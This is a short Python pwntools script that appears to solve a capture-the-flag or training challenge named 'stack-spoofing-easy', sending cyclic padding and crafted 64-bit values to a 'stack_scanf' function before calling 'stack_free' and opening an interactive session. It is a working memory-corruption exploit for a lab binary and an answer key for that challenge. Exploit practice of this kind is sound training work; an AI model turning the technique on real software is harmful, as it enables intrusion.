from pwn import *

proc = process('/challenge/stack-spoofing-easy')
proc.recvuntil(b'[*] Function')
proc.sendline(b'stack_scanf')
proc.sendline(cyclic(0x38)+p64(64)+p64(0)+p64(0))
proc.sendline(b'stack_free')
proc.interactive()
